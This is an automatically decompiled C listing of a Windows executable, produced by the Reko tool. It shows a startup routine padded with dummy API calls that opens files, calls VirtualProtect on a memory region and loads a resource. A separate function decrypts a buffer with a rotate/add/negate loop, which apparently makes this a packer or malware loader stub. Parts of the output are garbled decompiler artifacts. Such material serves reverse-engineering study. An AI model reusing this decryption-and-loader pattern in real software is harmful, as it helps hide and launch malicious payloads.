// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00425C9A: Register Eq_2 Win32CrtStartup()
Eq_2 Win32CrtStartup()
{
	GetCommandLineW();
	GetACP();
	GetCommandLineW();
	GetACP();
	Eq_2 eax_29 = LoadLibraryA(4403242);
	GetCommandLineA();
	GetProcAddress(eax_29, 0x00433034)();
	GetCommandLineW();
	struct Eq_31 * edx_49 = (struct Eq_31 *) <invalid>;
	struct Eq_31 * ebp_108 = (struct Eq_31 *) <invalid>;
	DWORD * esp_101 = fp - 0x48;
l00425CED:
	word32 * esp_69 = esp_101 - 0x04;
	*esp_69 = 36362;
	*(esp_69 - 0x04) = 0x00429000;
	*(ebp_108 - 0x28) = (LPSTR *) GetCommandLineA();
	*(esp_69 - 0x08) = 0x00;
	ptr32 esp_191 = esp_69 - 0x08;
	do
	{
		struct Eq_86 * esp_87 = esp_191 - 0x04;
		esp_87->t0000.u0 = 0x84;
		*(esp_87 - 0x04) = 0x03;
		*(esp_87 - 0x08) = 0x00;
		*(esp_87 - 0x0C) = 0x01;
		*(esp_87 - 0x10) = 0xC0000000;
		*(esp_87 - 0x14) = 4403223;
		Eq_2 eax_99 = CreateFileA(*(esp_87 - 0x14), *(esp_87 - 0x10), *(esp_87 - 0x0C), *(esp_87 - 0x08), *(esp_87 - 0x04), esp_87->t0000, esp_87->t0004);
		*(ebp_108 - 0x20) = (union Eq_2 *) eax_99;
		esp_101 = (DWORD *) &esp_87->t0008;
		if (eax_99 != ~0x00)
			goto l00425CED;
		ptr32 ecx_109 = fn00425E9B(dwArg00, dwArg04, dwArg08, out ebp_108);
		GetCurrentThreadId();
		esp_87->t0010 = *(ebp_108 - 0x20);
		GetFileType(esp_87->t0010);
		esp_87->t0010 = ebp_108 - 0x0C;
		esp_87->t000C = *(ebp_108 - 0x20);
		CloseHandle(esp_87->t000C);
		esp_87->t000C.u0 = 0x40;
		GetOEMCP();
		esp_87->t0008 = *(ebp_108 - 0x20);
		esp_87->t0004.u0 = 0x00;
		SizeofResource(esp_87->t0004, esp_87->t0008);
		esp_87->t0008.u0 = 36362;
		esp_87->t0004.u0 = 0x00429000;
		GetACP();
		esp_87->t0000 = *(ebp_108 - 0x20);
		GetFileType(esp_87->t0000);
		VirtualProtect(esp_87->t0004, esp_87->t0008, esp_87->t000C, esp_87->t0010);
		esp_87->t0010 = *(ebp_108 - 0x20);
		esp_87->t000C.u0 = 0x00;
		SizeofResource(esp_87->t000C, esp_87->t0010);
		esp_87->t0010 = *(ebp_108 - 0x20);
		esp_87->t000C.u0 = 0x00;
		Eq_221 eax_161 = LoadResource(esp_87->t000C, esp_87->t0010);
		*(ebp_108 - 0x24) = (HGLOBAL *) eax_161;
		byte ch_110 = SLICE(ecx_109, byte, 8);
		byte cl_111 = (byte) ecx_109;
		esp_101 = (DWORD *) &esp_87->t0014;
		if (eax_161 != null)
			goto l00425CED;
		Eq_2 esi_168 = esp_87->t0014;
		GetCurrentThreadId();
		Eq_2 edi_171 = esp_87->t0018;
		*(ebp_108 - 0x14) = (LPSTR *) GetCommandLineA();
		esp_87->t0018.u0 = 0x00;
		esp_87->t0014.u0 = 0x24;
		esp_87->t0010.u0 = 0x03;
		esp_87->t000C.u0 = 0x00;
		esp_87->t0008.u0 = 0x06;
		esp_87->t0004.u0 = 0xA0000000;
		esp_87->t0000.u0 = 0x00433000;
		Eq_2 eax_189 = CreateFileA(esp_87->t0000, esp_87->t0004, esp_87->t0008, esp_87->t000C, esp_87->t0010, esp_87->t0014, esp_87->t0018);
		*(ebp_108 - 0x1C) = (union Eq_2 *) eax_189;
		esp_191 = &esp_87->dw001C;
	} while (eax_189 != ~0x00);
	int32 ebx_195 = esp_87->dw001C;
	Eq_2 ebp_198 = ebp_108->t0000;
	ebp_108->t0000 = *(ebp_198 - 0x20);
	*(ebp_108 - 0x04) = 0x00;
	byte bl_196 = (byte) ebx_195;
	Eq_2 eax_205 = SizeofResource(*(ebp_108 - 0x04), ebp_108->t0000);
	edx_49->ptr4670858D = edx_49;
	*((word32) ebp_198 - 1651666296) = ebp_108->dw0004;
	ecx_109 - 99 + ebx_195 = (byte *) ch_110;
	(edi_171 - 99)[eax_205].b0000 = bl_196;
	*((word32) ebp_198 + 0x59ED9DE5) = cl_111;
	*((word32) eax_205 + (esi_168 * 0x04 - 634325089)) = bl_196;
	edx_49->dw1967E8B0 = edx_49->dw1967E8B0 >> 0x01;
}

// 00425E9B: Register word32 fn00425E9B(Stack (ptr32 word32) dwArg04, Stack uint32 dwArg08, Stack word32 dwArg0C, Register out ptr32 ebpOut)
word32 fn00425E9B(word32 * dwArg04, uint32 dwArg08, word32 dwArg0C, ptr32 & ebpOut)
{
	word32 * esi_17 = dwArg04;
	uint32 ebx_20 = dwArg08 >> 0x02;
	do
	{
		*esi_17 = *esi_17 + dwArg0C;
		*esi_17 = __rol(*esi_17, 0x11);
		*esi_17 = -*esi_17;
		*esi_17 = *esi_17 + dwArg0C;
		*esi_17 = *esi_17 - 272779949;
		*esi_17 = __ror(*esi_17, 0xA9);
		*esi_17 = *esi_17 - ~0x333B0B44;
		*esi_17 = *esi_17 - dwArg0C;
		*esi_17 = -*esi_17;
		*esi_17 = *esi_17 + dwArg0C;
		esi_17 = esi_17 + 0x01;
		ebx_20 = ebx_20 - 0x01;
	} while (ebx_20 != 0x00);
	word32 ebp_58;
	*ebpOut = ebp;
	return dwArg0C;
}

